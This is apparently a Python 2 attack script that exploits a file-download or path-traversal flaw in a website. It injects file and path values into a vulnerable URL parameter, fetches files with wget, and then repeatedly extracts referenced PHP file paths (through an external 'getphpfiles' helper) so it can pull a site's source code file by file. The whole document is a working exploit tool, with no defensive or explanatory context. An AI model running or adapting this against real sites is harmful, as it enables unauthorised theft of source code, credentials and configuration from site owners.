import sys
import os.path
import re
import optparse
import subprocess
parser = optparse.OptionParser()
parser.add_option("--url", "-U", help="Url of website", default=False, action="store")
parser.add_option("--file-parameter", "-f", help="parameter of file", default=False, action="store")
parser.add_option("--path-parameter", "-p", help="parameter of path. only needed with a 2 parameter vuln", default=False, action="store")
parser.add_option("--payload", "-P", help="payload", default=False, action="store")
parser.add_option("--prefix", help="prefix for all files", default=False, action="store")
parser.add_option("--loop", help="Times to reinitialize files", default=False, action="store")
(args, _) = parser.parse_args()

def abort():
	parser.print_help()
	exit()

if args.url == False or args.payload == False:
	abort()

if args.file_parameter == False:
	abort()

prefix = args.prefix
if args.prefix == False:
	prefix = ""



if args.loop == False:
	abort()


try:
	loop = int(args.loop)
except ValueError:
	abort()


def split_path(path):
	index = path.rfind('/')
	file = path[index + 1:]
	dirs = path[:index + 1]
	return {"file" : file, "path" : dirs}


url = args.url
file_param = args.file_parameter
path_param = args.path_parameter
payload = args.payload

countrycodes = ["com", "gov", "org", "edu", "mil", "us", "uk", "nl", "be", "it", "fr", "de", "net"]

def dl(file):
	

	index = file.rfind('/')
	
	if index != -1 and file[-1:] != "./":
		subprocess.call(["mkdir", '-p', split_path(file)["path"].replace("../", '') ])

	if path_param:
		path = split_path(file)["path"]

		payload_submit = url.replace("{}=".format(path_param), "{}={}".format(path_param, path) )
		payload_submit = payload_submit.replace("{}=".format(file_param), "{}={}".format(file_param, split_path(file)["file"] ) )
	else:
		payload_submit = url.replace("{}=".format(file_param), "{}={}".format(file_param, file))


	subprocess.call(["wget", payload_submit, "-O", file], stderr=open(os.devnull, 'wb'))

#dl(payload

dl(prefix + payload)

devnull = open(os.devnull, 'wb')

for i in range(loop):
	subprocess.call(["./getphpfiles"], stderr=devnull)

	f = open("list.txt", "r")
	text = f.read()

	for country in countrycodes:
		text = text.replace(".{}/".format(country), '')
		
	f.close()
	f = open("list.txt", 'w')

	f.write(text)
	f.close()
	subprocess.call(["sort", "-u", "list.txt", "-o", "list.txt"])

	f = open("list.txt", 'r')
	text = f.read()
	lines = text.splitlines()


	for line in lines:
		if os.path.isfile(line) == False:
			print "[+] Downloading {}".format(line)
			dl(prefix + line)
